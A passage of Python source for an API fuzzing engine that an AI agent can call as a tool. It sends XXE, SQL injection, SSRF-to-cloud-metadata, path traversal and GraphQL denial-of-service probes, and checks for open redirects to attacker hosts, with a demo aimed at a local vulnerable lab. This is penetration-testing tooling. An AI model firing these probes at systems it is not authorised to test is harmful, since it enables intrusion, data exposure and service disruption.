    for payload, label in _P["xxe"]:
        _LIMITER.acquire()
        t0 = time.monotonic()
        try:
            r = sess.request(method, url, headers=xml_hdrs,
                             data=payload.encode(),
                             timeout=timeout, allow_redirects=False)
            body = r.text[:3000]
            hit  = any(ind in body for ind in indicators)

            f = Finding(
                url=url, method=method, payload=payload[:200],
                vuln_type="xxe" if hit else "none",
                severity="critical" if hit else "info",
                status=r.status_code,
                resp_time=round(time.monotonic() - t0, 3),
                resp_size=len(r.content),
                snippet=body[:300],
                interesting=hit or r.status_code == 500,
                evidence=(["XXE confirmed: file/metadata in response"] if hit else
                          ["500 on XML payload"] if r.status_code == 500 else []),
            ) if (hit or r.status_code == 500) else None

            if f and _DEDUP.is_new(f):
                findings.append(f)
        except Exception:
            pass

    return findings


# ─── Path param fuzzing ─────────────────────────────────────────────────────

def fuzz_path_params(
    base_url:  str,
    template:  str,
    sess:      requests.Session,
    payloads:  list[tuple[str, str, str]],
    timeout:   int = 8,
) -> list[Finding]:
    findings: list[Finding] = []

    bl_status, bl_len = None, None
    try:
        _LIMITER.acquire()
        bl = sess.get(base_url.rstrip("/") + template.replace("FUZZ", "1"),
                      timeout=timeout)
        bl_status = bl.status_code
        bl_len    = len(bl.content)
    except Exception:
        pass

    for payload, label, cat in payloads:
        safe = payload if cat == "lfi" else \
            payload.replace("/", "%2F").replace("?", "%3F")
        url = base_url.rstrip("/") + template.replace("FUZZ", safe)
        _LIMITER.acquire()
        t0 = time.monotonic()
        try:
            r = sess.get(url, timeout=timeout, allow_redirects=False)
            f = _confirm(
                url=url, method="GET", param="path:FUZZ",
                payload=payload, label=label, cat=cat,
                status=r.status_code,
                body=r.text[:3000],
                hdrs={k.lower(): v for k, v in r.headers.items()},
                elapsed=time.monotonic() - t0,
                bl_status=bl_status, bl_len=bl_len,
            )
            if f and _DEDUP.is_new(f):
                findings.append(f)
        except Exception:
            pass

    return findings


# ─── GraphQL fuzzing ────────────────────────────────────────────────────────

def fuzz_graphql(
    url:     str,
    sess:    requests.Session,
    timeout: int = 8,
) -> list[Finding]:
    findings: list[Finding] = []
    gh = {"Content-Type": "application/json"}

    # Introspection
    intro_q = {"query": "{ __schema { types { name kind fields { name args { name } } } } }"}
    field_count = 0
    try:
        _LIMITER.acquire()
        ir = sess.post(url, json=intro_q, headers=gh, timeout=timeout)
        if ir.status_code == 200:
            types = (ir.json().get("data") or {}).get("__schema", {}).get("types", [])
            field_count = sum(
                len(t.get("fields") or []) for t in types
                if t.get("kind") == "OBJECT" and not t["name"].startswith("__")
            )
            if field_count:
                f = Finding(
                    url=url, method="POST",
                    payload="introspection",
                    vuln_type="graphql_introspection_enabled",
                    severity="medium", status=ir.status_code,
                    evidence=[f"Introspection enabled — {field_count} fields exposed"],
                ).stamp()
                if _DEDUP.is_new(f):
                    findings.append(f)
    except Exception:
        pass

    # Injection probes
    probes = [
        ({"query": '{ user(id: "1 OR 1=1") { id email } }'},            "gql_sqli"),
        ({"query": '{ user(id: "\'") { id } }'},                        "gql_sqli_q"),
        ({"query": " ".join(f'a{i}:user(id:1){{id}}' for i in range(50))}, "gql_alias_dos"),
        ({"query": "{ " + "user { friend { " * 12 + "id" + " } }" * 12 + " }"},
                                                                          "gql_depth"),
        ([{"query": "{ __typename }"}] * 30,                             "gql_batch"),
        ({"query": '{ fetch(url:"http://169.254.169.254/latest/meta-data/"){data} }'},
                                                                          "gql_ssrf"),
    ]

    for payload, label in probes:
        _LIMITER.acquire()
        t0 = time.monotonic()
        try:
            r = sess.post(url, json=payload, headers=gh, timeout=timeout)
            elapsed = time.monotonic() - t0
            body    = r.text[:3000]
            hit = (r.status_code == 500 or elapsed > 2.5 or
                   any(s in body.lower() for s in
                       ["sql", "exception", "traceback", "root:x:", "ami-id"]))
            if hit:
                f = Finding(
                    url=url, method="POST",
                    payload=json.dumps(payload)[:200],
                    vuln_type="graphql_injection",
                    severity="high", status=r.status_code,
                    resp_time=round(elapsed, 3),
                    snippet=body[:300],
                    evidence=[f"[{label}] status={r.status_code} t={elapsed:.2f}s"],
                ).stamp()
                if _DEDUP.is_new(f):
                    findings.append(f)

        except requests.Timeout:
            if any(k in label for k in ("dos", "depth", "batch", "alias")):
                f = Finding(
                    url=url, method="POST",
                    payload=label,
                    vuln_type="graphql_dos",
                    severity="medium",
                    resp_time=float(timeout),
                    evidence=[f"Timeout on '{label}' — DoS possible"],
                ).stamp()
                if _DEDUP.is_new(f):
                    findings.append(f)
        except Exception as e:
            log.debug("graphql: %s", e)

    return findings


# ══════════════════════════════════════════════════════════════════════════════
# §9  TOOL PARSERS  (ffuf)
# ══════════════════════════════════════════════════════════════════════════════

_INTERESTING = {200, 201, 202, 204, 301, 302, 307, 308,
                401, 403, 405, 415, 422, 500, 501, 502}

def _parse_ffuf(stdout: str, target: str) -> list[Finding]:
    out: list[Finding] = []

    def _make(url: str, status: int, length: int, fuzz: str) -> Optional[Finding]:
        if status not in _INTERESTING or status == 404:
            return None
        return Finding(
            url=url, method="GET",
            payload=fuzz[:200], vuln_type="wordlist_hit",
            severity="medium" if status in (200, 201) else "info",
            status=status, resp_size=length,
            evidence=[f"ffuf status={status} size={length}"],
        ).stamp()

    try:
        data = json.loads(stdout)
        for r in data.get("results", []):
            inp  = r.get("input", {})
            fuzz = inp.get("FUZZ", b"")
            if isinstance(fuzz, bytes):
                fuzz = fuzz.decode(errors="replace")
            f = _make(r.get("url", ""), r.get("status", 0),
                      r.get("length", 0), fuzz)
            if f and _DEDUP.is_new(f):
                out.append(f)
        return out
    except json.JSONDecodeError:
        pass

    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            r    = json.loads(line)
            fuzz = r.get("input", {}).get("FUZZ", "")
            if isinstance(fuzz, bytes):
                fuzz = fuzz.decode(errors="replace")
            f = _make(r.get("url", ""), r.get("status", 0),
                      r.get("length", 0), fuzz)
            if f and _DEDUP.is_new(f):
                out.append(f)
        except json.JSONDecodeError:
            pass

    if not out:
        for line in stdout.splitlines():
            m = re.search(r"(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)", line)
            if m:
                status = int(m.group(2))
                f = _make(target.rstrip("/") + "/" + m.group(1).lstrip("/"),
                           status, int(m.group(3)), m.group(1))
                if f and _DEDUP.is_new(f):
                    out.append(f)

    return out


# ══════════════════════════════════════════════════════════════════════════════
# §10  SUBPROCESS + TOOL CHECKS
# ══════════════════════════════════════════════════════════════════════════════

def _run(cmd: list[str], timeout: int) -> tuple[str, str, int]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, shell=False)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timeout after {timeout}s", -1
    except FileNotFoundError:
        return "", f"'{cmd[0]}' not on PATH", -1
    except Exception as e:
        return "", str(e), -1


def _which(name: str) -> bool:
    import shutil
    return shutil.which(name) is not None


def _ffuf_body(body: Optional[str], ct: str) -> str:
    """Inject FUZZ marker into every value of a JSON or form body."""
    if not body:
        return '{"id":"FUZZ","user":"FUZZ"}' if "json" in ct else "id=FUZZ&user=FUZZ"
    if "json" in ct:
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                return json.dumps({k: "FUZZ" for k in obj})
        except Exception:
            pass
        return body.rstrip().rstrip("}") + ',"__fuzz":"FUZZ"}'
    if "form" in ct:
        try:
            return urlencode({k: "FUZZ" for k in parse_qs(body)})
        except Exception:
            pass
    return body + "&__fuzz=FUZZ"


def _count_wordlist_entries(path: str) -> int:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for line in f if line.strip() and not line.lstrip().startswith("#"))
    except Exception:
        return 0


# ══════════════════════════════════════════════════════════════════════════════
# §11  POST-PROCESSING
# ══════════════════════════════════════════════════════════════════════════════

def _build_param_summaries(findings: list[Finding]) -> list[ParamSummary]:
    bucket: dict[str, list[Finding]] = {}
    for f in findings:
        if f.param:
            key = f"{f.url}|{f.param}"
            bucket.setdefault(key, []).append(f)

    summaries: list[ParamSummary] = []
    for key, fs in bucket.items():
        url, param = key.split("|", 1)
        vtypes = list({f.vuln_type for f in fs if f.vuln_type != "none"})
        max_sv = max((_SEV.get(f.severity, 0) for f in fs), default=0)
        sv_name = next((k for k, v in _SEV.items() if v == max_sv), "info")
        summaries.append(ParamSummary(
            param=param, endpoint=url,
            vulns=vtypes,
            evidence=list({e for f in fs for e in f.evidence})[:5],
            severity=sv_name,
            vulnerable=bool(vtypes),
        ))

    summaries.sort(key=lambda s: _SEV.get(s.severity, 0), reverse=True)
    return summaries


def _replay_request_for_finding(
    sess: requests.Session,
    finding: Finding,
    timeout: int = 8,
) -> tuple[Optional[int], str, dict[str, str], float, Optional[str]]:
    """
    Best-effort replay of a finding to reduce false positives.
    Returns: (status, body, headers, elapsed, error)
    """
    method = finding.method or "GET"
    url = finding.url
    extra_headers: dict[str, str] = {}
    params: Optional[dict[str, str]] = None
    json_body: Optional[dict[str, str]] = None

    if finding.param and finding.param.startswith("header:"):
        hdr = finding.param.split(":", 1)[1]
        extra_headers[hdr] = finding.payload
    elif finding.param and finding.param.startswith("path:"):
        # URL already contains path payload for path-fuzz findings.
        pass
    elif finding.param and "?" in url:
        # URL-param fuzz case (stored URL uses placeholder text).
        url = url.split("?", 1)[0]
        params = {finding.param: finding.payload}
    elif finding.param:
        # Body-field fuzz case.
        if method in {"GET", "HEAD", "OPTIONS"}:
            params = {finding.param: finding.payload}
        else:
            json_body = {finding.param: finding.payload}

    t0 = time.monotonic()
    try:
        _LIMITER.acquire()
        r = sess.request(
            method,
            url,
            params=params,
            json=json_body,
            headers=extra_headers or None,
            timeout=timeout,
            allow_redirects=False,
        )
        elapsed = time.monotonic() - t0
        return r.status_code, r.text[:3000], {k.lower(): v for k, v in r.headers.items()}, elapsed, None
    except Exception as exc:
        return None, "", {}, 0.0, str(exc)


def _is_reconfirmed(finding: Finding, status: Optional[int], body: str, hdrs: dict[str, str], elapsed: float) -> tuple[bool, str]:
    """Heuristic replay validator per finding type."""
    vt = finding.vuln_type

    if vt == "xss_reflection":
        return (finding.payload[:20] in body, "payload reflected again")

    if vt == "time_based_injection":
        return (elapsed > 2.5, f"replay delay={elapsed:.2f}s")

    if vt == "auth_bypass":
        return (status in {200, 201, 204}, f"status={status}")

    if vt == "ssrf":
        loc = hdrs.get("location", "")
        hit = bool(status in {301, 302, 307, 308} and any(k in loc for k in ("169.254", "metadata", "localhost", "127.")))
        return (hit, f"redirect={loc[:120]}")

    if vt == "open_redirect":
        loc = hdrs.get("location", "")
        hit = bool(status in {301, 302, 307, 308} and ("evil.com" in loc or "attacker" in loc))
        return (hit, f"redirect={loc[:120]}")

    if vt == "secret_disclosure":
        hit = bool(_secrets(body))
        return (hit, "secret-like material observed again")

    if vt == "server_error":
        return (bool(status and status >= 500), f"status={status}")

    # Fallback: same status with high-impact HTTP response classes.
    fallback = bool(status == finding.status and status is not None and (status >= 500 or status in {200, 201, 204, 401, 403}))
    return (fallback, f"status={status}, expected={finding.status}")


def _replay_confirm_findings(
    findings: list[Finding],
    headers: dict[str, str],
    timeout: int,
    max_attempts: int,
) -> list[Finding]:
    confirmed: list[Finding] = []
    sess = _session(headers)
    attempts = 0

    for f in findings:
        if attempts >= max_attempts:
            break
        attempts += 1
        status, body, hdrs, elapsed, err = _replay_request_for_finding(sess, f, timeout=min(timeout, 8))
        if err:
            continue
        ok, replay_note = _is_reconfirmed(f, status, body, hdrs, elapsed)
        if not ok:
            continue

        cf = f.model_copy(deep=True)
        cf.evidence = list(dict.fromkeys([*cf.evidence, f"replay_confirmed: {replay_note}"]))[:10]
        confirmed.append(cf)

    return confirmed


def _compact_finding_brief(f: Finding) -> dict[str, Any]:
    brief: dict[str, Any] = {
        "u": f.url,
        "m": f.method,
        "t": f.vuln_type,
        "s": f.severity,
    }
    if f.param:
        brief["p"] = f.param
    if f.status is not None:
        brief["st"] = f.status
    if f.evidence:
        brief["e"] = f.evidence[:2]
    return brief


def _build_llm_brief(
    target: str,
    tested_endpoints: list[str],
    discovered_endpoints: list[str],
    vulnerable: bool,
    confidence: str,
    quick_mode: bool,
    confirmed_findings: list[Finding],
    critical_findings: list[Finding],
    method_results: list[MethodResult],
    content_type_results: list[ContentTypeResult],
    coverage_note: str,
    error: Optional[str],
) -> dict[str, Any]:
    method_hits = [
        {
            "u": m.endpoint,
            "x": m.unexpected[:4],
            "e": m.evidence[:2],
        }
        for m in method_results
        if m.vulnerable
    ][:4]

    content_type_hits = [
        {
            "u": c.endpoint,
            "m": c.method,
            "a": c.accepted[:4],
            "e": c.evidence[:2],
        }
        for c in content_type_results
        if c.bypassed
    ][:4]

    confirmed_hashes = {cf._hash for cf in confirmed_findings}
    unconfirmed_high = [
        f for f in critical_findings
        if f._hash not in confirmed_hashes
    ][:4]

    brief: dict[str, Any] = {
        "t": target,
        "v": vulnerable,
        "c": confidence,
        "qm": quick_mode,
        "te": len(tested_endpoints),
        "de": len(discovered_endpoints),
        "cf": [_compact_finding_brief(f) for f in confirmed_findings[:4]],
        "uf": [_compact_finding_brief(f) for f in unconfirmed_high],
        "mv": method_hits,
        "ct": content_type_hits,
        "cn": coverage_note[:220],
    }
    if error:
        brief["err"] = error[:240]
    return brief


# ══════════════════════════════════════════════════════════════════════════════
# §12  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def api_fuzzing(
    tool:        str,
    target:      str,
    args:        list[str]       = [],
    timeout:     int             = 600,
    endpoints:   list[str]       = [],
    headers:     dict[str, str]  = {},
    wordlist:    Optional[str]   = None,
    methods:     list[str]       = ["GET", "POST", "PUT", "DELETE", "PATCH"],
    params:      dict[str, str]  = {},
    body:        Optional[str]   = None,
    rps:         float           = 30.0,
    openapi_url: Optional[str]   = None,
    quick:       bool            = False,
    payload_cap: int             = 15,
    max_endpoints: int           = 0,
    confirm_findings: bool       = True,
    confirmation_attempts: int   = 8,
) -> dict:
    """
    API Fuzzing Engine v3.

    Args
    ────
    tool        "manual" | "ffuf"
    target      Base API URL
    endpoints   Extra paths/URLs to fuzz
    headers     HTTP headers (auth tokens, etc.)
    wordlist    Wordlist path (ffuf)
    methods     HTTP methods to test
    params      Baseline query params  e.g. {"id":"1","q":"test"}
    body        Baseline request body  e.g. '{"user":"admin"}'
    rps         Global request rate cap (req/sec)
    openapi_url URL of OpenAPI/Swagger JSON spec (auto-discovers endpoints)

    Returns
    ───────
    {
      critical_findings   list[Finding]         ← agent starts here
      param_summaries     list[ParamSummary]    ← per-param verdict
      method_results      list[MethodResult]
      content_type_results list[ContentTypeResult]
      discovered_endpoints list[str]            ← from OpenAPI
      total_sent          int
      total_interesting   int
      exec_time           float
      error               str | None
    }
    """
    global _LIMITER
    t0 = time.monotonic()

    # ── Validate ──────────────────────────────────────────────────────────
    try:
        req = FuzzRequest(
            tool=tool, target=target, args=args,
            timeout=timeout,
            endpoints=endpoints, headers=headers,
            wordlist=wordlist, methods=methods,
            params=params, body=body,
            rps=rps, openapi_url=openapi_url,
            quick=quick, payload_cap=payload_cap,
            max_endpoints=max_endpoints,
            confirm_findings=confirm_findings,
            confirmation_attempts=confirmation_attempts,
        )
    except Exception as e:
        return FuzzResult(
            success=False, tool=tool, target=target,
            command="", error=f"Validation: {e}",
        ).model_dump()

    _DEDUP.reset()
    _LIMITER = _TokenBucket(rps=req.rps)

    if not target.startswith("http"):
        target = f"https://{target}"
    target = target.rstrip("/")

    # ── OpenAPI auto-discovery ────────────────────────────────────────────
    oa_eps: list[str]       = []
    oa_params: dict[str, dict] = {}
    if req.openapi_url:
        spec = fetch_openapi(req.openapi_url)
        if spec:
            oa_eps, oa_params = parse_openapi(spec, target)

    # ── Build full endpoint list ──────────────────────────────────────────
    all_eps: list[str] = [target]
    for e in req.endpoints + oa_eps:
        full = e if e.startswith("http") else target + "/" + e.lstrip("/")
        if full not in all_eps:
            all_eps.append(full)

    if req.quick:
        # Quick mode should stay lightweight, but one endpoint is often too
        # shallow to give an agent useful signal.
        non_root = [ep for ep in all_eps if ep.rstrip("/") != target]
        quick_cap = min(req.max_endpoints or 3, 3)
        all_eps = non_root[:quick_cap] if non_root else all_eps[:1]
    elif req.max_endpoints > 0:
        all_eps = all_eps[:req.max_endpoints]

    # ── Shared accumulators ───────────────────────────────────────────────
    all_findings:  list[Finding]             = []
    method_res:    list[MethodResult]        = []
    ct_res:        list[ContentTypeResult]   = []
    command_str    = ""
    raw_out        = ""
    error_msg: Optional[str]                 = None
    techniques:    list[str]                 = []
    ffuf_estimated_sent: int                 = 0

    effective_cap = min(req.payload_cap, 3) if req.quick else req.payload_cap
    all_payloads = _payloads(cap=effective_cap)

    # ══════════════════════════════════════════════════════════════════════
    # MANUAL ENGINE
    # ══════════════════════════════════════════════════════════════════════
    if tool == "manual":
        command_str = f"manual({target}, {len(all_eps)} endpoints, rps={req.rps})"

        for ep in all_eps:
            ep_params = {**req.params, **(oa_params.get(ep, {}))}
            sess      = _session(req.headers)

            ep_params_quick = ep_params
            quick_payloads = all_payloads
            quick_body = req.body
            if req.quick:
                qp = [p for p in all_payloads if p[2] in {"sqli", "xss", "cmdi", "ssrf"}]
                quick_payloads = qp[:4] if qp else all_payloads[:4]
                if ep_params:
                    k = next(iter(ep_params.keys()))
                    ep_params_quick = {k: ep_params[k]}
                else:
                    ep_params_quick = {"id": "1"}
                quick_body = req.body or '{"id":"1"}'

            def _run_ep(ep=ep, ep_params=ep_params, sess=sess):
                fs: list[Finding] = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=4 if req.quick else 8) as ex:
                    jobs: dict[concurrent.futures.Future, str] = {}

                    jobs[ex.submit(fuzz_url_params, ep, "GET",
                                   ep_params_quick if req.quick else ep_params,
                                   sess,
                                   quick_payloads if req.quick else all_payloads,
                                   4 if req.quick else 8)] = "url_params"

                    jobs[ex.submit(fuzz_body_params, ep, "POST",
                                   quick_body if req.quick else req.body,
                                   "application/json",
                                   sess,
                                   quick_payloads if req.quick else all_payloads,
                                   4 if req.quick else 8)] = "body_post"

                    if not req.quick:
                        jobs[ex.submit(fuzz_body_params, ep, "PUT",
                                       req.body, "application/json",
                                       sess, all_payloads[:50])] = "body_put"

                        jobs[ex.submit(fuzz_headers, ep, "GET",
                                       sess, all_payloads)] = "headers"

                    if req.quick:
                        jobs[ex.submit(
                            fuzz_methods,
                            ep,
                            sess,
                            3,
                            ["GET", "POST", "OPTIONS", "TRACE"],
                            True,
                        )] = "__method__"
                    else:
                        jobs[ex.submit(fuzz_methods, ep, sess)] = "__method__"

                    if not req.quick:
                        jobs[ex.submit(fuzz_xxe, ep, "POST", sess)] = "xxe"
                        jobs[ex.submit(fuzz_content_types, ep, "POST",
                                       req.body or '{"test":"fuzz"}',
                                       sess)] = "__ct__"

                    if any(kw in ep.lower() for kw in
                           ["graphql", "graphiql", "/gql", "/query"]):
                        jobs[ex.submit(fuzz_graphql, ep, sess)] = "graphql"

                    for fut, label in jobs.items():
                        try:
                            res = fut.result()
                        except Exception as exc:
                            log.warning("[%s] %s", label, exc)
                            continue

                        if label == "__method__":
                            method_res.append(res)
                            techniques.append("method_fuzz")
                        elif label == "__ct__":
                            ct_res.append(res)
                            techniques.append("content_type_fuzz")
                        else:
                            fs.extend(res)
                            if res:
                                techniques.append(label)

                # Path param fuzzing
                if not req.quick:
                    ep_path = re.sub(r"https?://[^/]+", "", ep)
                    tpl = (ep_path.rstrip("/") + "/FUZZ") if ep_path and ep_path != "/" \
                        else "/api/FUZZ"
                    path_pl = [(p, l, c) for p, l, c in all_payloads
                               if c in ("lfi", "overflow", "sqli")][:30]
                    fs.extend(fuzz_path_params(target, tpl, _session(req.headers),
                                               path_pl))
                return fs

            ep_findings = _run_ep()
            all_findings.extend(ep_findings)

    # ══════════════════════════════════════════════════════════════════════
    # FFUF ENGINE
    # ══════════════════════════════════════════════════════════════════════
    elif tool == "ffuf":
        if not _which("ffuf"):
            return FuzzResult(
                success=False, tool=tool, target=target,
                command="", error="ffuf not on PATH",
            ).model_dump()

        tmp_wl = None
        wl_path = req.wordlist
        wl_count = 0
        if not wl_path:
            tmp_wl  = tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False, prefix="fuzz_wl_")
            wl_cap = 2 if req.quick else 30
            tmp_wl.write("\n".join(p for p, _, _ in _payloads(cap=wl_cap)))
            tmp_wl.close()
            wl_path = tmp_wl.name
            wl_count = wl_cap
        else:
            wl_count = _count_wordlist_entries(wl_path)

        cmds: list[str] = []
        for ep in all_eps:
            ep_p    = {**req.params, **(oa_params.get(ep, {}))}
            param   = list(ep_p.keys())[0] if ep_p else "id"
            furl    = f"{ep}?{param}=FUZZ"
            if req.quick:
                budget = min(12, max(6, req.timeout // max(1, len(all_eps))))
            else:
                budget = max(30, req.timeout // max(1, len(all_eps)))

            # GET param fuzz
            cmd = ["ffuf", "-u", furl, "-w", f"{wl_path}:FUZZ",
                   "-mc", "all", "-fc", "404",
                   "-json", "-timeout", "8"]
            if req.quick:
                cmd += [
                    "-t", "5",
                    "-rate", str(min(10, max(1, int(req.rps)))),
                    "-maxtime", "10",
                    "-maxtime-job", "8",
                    "-s",
                ]
            else:
                cmd += ["-t", "30", "-rate", str(int(req.rps))]
            for k, v in req.headers.items():
                cmd += ["-H", f"{k}: {v}"]
            cmd += list(req.args)
            cmds.append(" ".join(cmd))
            ffuf_estimated_sent += max(0, wl_count)

            out, err, rc = _run(cmd, budget)
            raw_out += (out or err)[:2000]
            all_findings.extend(_parse_ffuf(out, ep))
            if rc != 0 and not all_findings:
                error_msg = (err or out)[:300]

            # POST body fuzz
            if ("POST" in req.methods or "PUT" in req.methods) and not req.quick:
                fuzzed_body = _ffuf_body(req.body, "application/json")
                cmd_post = [
                    "ffuf", "-u", ep, "-w", f"{wl_path}:FUZZ",
                    "-X", "POST", "-d", fuzzed_body,
                    "-H", "Content-Type: application/json",
                    "-mc", "all", "-fc", "404",
                    "-json", "-t", "20",
                    "-rate", str(max(10, int(req.rps // 2))),
                ]
                for k, v in req.headers.items():
                    cmd_post += ["-H", f"{k}: {v}"]
                cmds.append(" ".join(cmd_post))
                ffuf_estimated_sent += max(0, wl_count)
                out2, _, _ = _run(cmd_post, budget)
                all_findings.extend(_parse_ffuf(out2, ep))

        command_str = " | ".join(cmds[:3])
        techniques.append("ffuf")

        if not req.quick:
            for ep in all_eps[:3]:
                s = _session(req.headers)
                method_res.append(fuzz_methods(ep, s))
                ct_res.append(fuzz_content_types(ep, "POST",
                                                  req.body or '{"test":"fuzz"}', s))
                all_findings.extend(fuzz_xxe(ep, "POST", s))
            techniques += ["method_fuzz", "content_type_fuzz", "xxe"]

        if tmp_wl and os.path.exists(wl_path):
            os.unlink(wl_path)

    # ══════════════════════════════════════════════════════════════════════
    # ══════════════════════════════════════════════════════════════════════
    # POST-PROCESS
    # ══════════════════════════════════════════════════════════════════════
    all_findings.sort(key=lambda f: _SEV.get(f.severity, 0), reverse=True)

    critical = [f for f in all_findings if f.severity in ("critical", "high")]
    candidates = [f for f in all_findings if _SEV.get(f.severity, 0) >= _SEV["high"]]
    confirmed_findings = (
        _replay_confirm_findings(
            candidates,
            headers=req.headers,
            timeout=req.timeout,
            max_attempts=req.confirmation_attempts,
        )
        if req.confirm_findings and candidates
        else []
    )

    method_vuln = any(m.vulnerable for m in method_res)
    ct_vuln = any(c.bypassed for c in ct_res)
    vulnerable = bool(confirmed_findings or method_vuln or ct_vuln)

    if confirmed_findings:
        confidence = "high"
    elif critical or method_vuln or ct_vuln:
        confidence = "medium"
    elif all_findings:
        confidence = "low"
    else:
        confidence = "none"

    param_summaries = _build_param_summaries(all_findings)
    total_requests = int(_LIMITER.used + ffuf_estimated_sent)
    if req.quick:
        coverage_note = (
            "quick smoke profile: low coverage (few endpoints/payloads, reduced checks). "
            "Use quick=false and provide real authenticated endpoints for vulnerability discovery."
        )
    else:
        coverage_note = (
            "full profile: broader payloads and checks enabled. "
            "No confirmed finding means no high-confidence signal under tested coverage."
        )

    llm_brief = _build_llm_brief(
        target=target,
        tested_endpoints=all_eps,
        discovered_endpoints=oa_eps,
        vulnerable=vulnerable,
        confidence=confidence,
        quick_mode=req.quick,
        confirmed_findings=confirmed_findings,
        critical_findings=critical,
        method_results=method_res,
        content_type_results=ct_res,
        coverage_note=coverage_note,
        error=error_msg,
    )

    success = (error_msg is None) or bool(
        all_findings or method_res or ct_res or oa_eps
    )

    return FuzzResult(
        success=success,
        vulnerable=vulnerable,
        confidence=confidence,
        tool=tool, target=target, command=command_str,
        exec_time=round(time.monotonic() - t0, 2),
        techniques=list(dict.fromkeys(techniques)),
        discovered_endpoints=oa_eps,
        critical_findings=critical,
        confirmed_findings=confirmed_findings,
        param_summaries=param_summaries,
        method_results=method_res,
        content_type_results=ct_res,
        quick_mode=req.quick,
        coverage_note=coverage_note,
        total_sent=total_requests,
        total_findings=len(all_findings),
        total_interesting=len(critical),
        llm_brief=llm_brief,
        error=error_msg,
    ).model_dump()


# ══════════════════════════════════════════════════════════════════════════════
# §13  TOOL DEFINITION  (agent schema)
# ══════════════════════════════════════════════════════════════════════════════

API_FUZZING_TOOL_DEFINITION = {
    "name": "api_fuzzing",
    "description": (
        "Fuzz API endpoints for injection, auth bypass, method abuse, content-type "
        "bypass, and secret leakage. Auto-discovers endpoints via OpenAPI spec. "
        "Returns pre-ranked critical_findings[] and param_summaries[] — agent should "
        "read those first and use llm_brief for compact triage. "
        "Payloads: SQLi/NoSQL, XSS, SSTI, LFI, CMDi, Overflow, SSRF, XXE, "
        "Open Redirect. Includes GraphQL introspection + injection, "
        "HTTP method fuzzing (20 methods), content-type bypass (14 types), "
        "header injection, entropy-based secret detection. "
        "Tool: manual=all built-in (recommended), ffuf=wordlist brute-force."
    ),
    "parameters": {
        "type": "object",
        "required": ["tool", "target"],
        "properties": {
            "tool":        {"type": "string", "enum": ["manual","ffuf"]},
            "target":      {"type": "string"},
            "timeout":     {"type": "integer", "default": 600, "minimum": 30, "maximum": 7200},
            "endpoints":   {"type": "array", "items": {"type": "string"}},
            "headers":     {"type": "object"},
            "params":      {"type": "object"},
            "body":        {"type": "string"},
            "methods":     {"type": "array", "items": {"type": "string"}},
            "wordlist":    {"type": "string"},
            "rps":         {"type": "number", "default": 30},
            "openapi_url": {"type": "string"},
            "quick":       {"type": "boolean", "default": False},
            "payload_cap": {"type": "integer", "default": 15, "minimum": 1, "maximum": 30},
            "max_endpoints": {"type": "integer", "default": 0, "minimum": 0, "maximum": 100},
            "confirm_findings": {
                "type": "boolean",
                "default": True,
                "description": "Replay high-signal findings to validate vulnerability indicators.",
            },
            "confirmation_attempts": {
                "type": "integer",
                "default": 8,
                "minimum": 1,
                "maximum": 30,
                "description": "Max replay validations for high-signal payload findings.",
            },
            "args":        {"type": "array", "items": {"type": "string"}},
        },
    },
}


# ══════════════════════════════════════════════════════════════════════════════
# §14  QUICK-START
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    os.environ.setdefault("PENTAFORGE_ALLOW_LOCAL_API_TARGETS", "1")

    target = os.getenv("PENTAFORGE_FUZZ_TARGET", "http://localhost:8888/api").rstrip("/")
    profile_env = os.getenv("PENTAFORGE_FUZZ_PROFILE")
    profile = (profile_env or "smoke").strip().lower()

    parsed_target = urlparse(target)
    auto_crapi_target = (
        profile_env is None
        and parsed_target.scheme in {"http", "https"}
        and parsed_target.hostname in {"localhost", "127.0.0.1"}
        and (parsed_target.port in {None, 8888})
        and parsed_target.path.rstrip("/") == "/api"
    )
    if auto_crapi_target:
        profile = "crapi"

    full_main_env = os.getenv("PENTAFORGE_FUZZ_MAIN_FULL")
    if full_main_env is None:
        # Keep default runs lightweight unless the user explicitly selected a full profile.
        full_main = bool(profile_env) and profile == "crapi"
    else:
        full_main = full_main_env == "1"

    auth_token = os.getenv("PENTAFORGE_FUZZ_AUTH_TOKEN", "").strip()
    shared_headers: dict[str, str] = {}
    if auth_token:
        shared_headers["Authorization"] = f"Bearer {auth_token}"

    # Optional JSON map of extra headers, e.g. '{"X-Tenant":"demo"}'
    env_headers = os.getenv("PENTAFORGE_FUZZ_HEADERS", "").strip()
    if env_headers:
        try:
            parsed = json.loads(env_headers)
            if isinstance(parsed, dict):
                for k, v in parsed.items():
                    if isinstance(k, str) and isinstance(v, str):
                        shared_headers[k] = v
        except Exception:
            print("Warning: PENTAFORGE_FUZZ_HEADERS must be valid JSON object; ignoring.")

    crapi_endpoints = [
        "/identity/api/auth/login",
        "/identity/api/auth/signup",
        "/identity/api/v2/user/dashboard",
        "/workshop/api/shop/products",
        "/workshop/api/shop/orders",
        "/workshop/api/mechanic/report",
        "/workshop/api/merchant/contact_mechanic",
        "/community/api/v2/user/posts",
    ]

    default_endpoints = crapi_endpoints if profile == "crapi" else ["/v1/users"]
    max_eps_env = os.getenv("PENTAFORGE_FUZZ_MAX_ENDPOINTS", "").strip()
    if max_eps_env.isdigit():
        max_eps = int(max_eps_env)
    elif profile == "crapi":
        max_eps = 12 if full_main else 4
    else:
        max_eps = 1
    openapi_url = os.getenv("PENTAFORGE_FUZZ_OPENAPI_URL")

    cases: list[tuple[str, dict[str, Any]]] = [
        (
            "manual",
            {
                "tool": "manual",
                "target": target,
                "timeout": 240 if full_main else 45,
                "endpoints": default_endpoints,
                "headers": shared_headers,
                "params": {"id": "1", "q": "test"},
                "methods": ["GET", "POST", "PUT", "PATCH", "DELETE"],
                "rps": 20,
                "quick": not full_main,
                "payload_cap": 12 if full_main else 2,
                "max_endpoints": max_eps,
                "openapi_url": openapi_url,
            },
        ),
        (
            "ffuf",
            {
                "tool": "ffuf",
                "target": target,
                "timeout": 180 if full_main else 45,
                "endpoints": default_endpoints,
                "headers": shared_headers,
                "params": {"id": "1"},
                "args": (
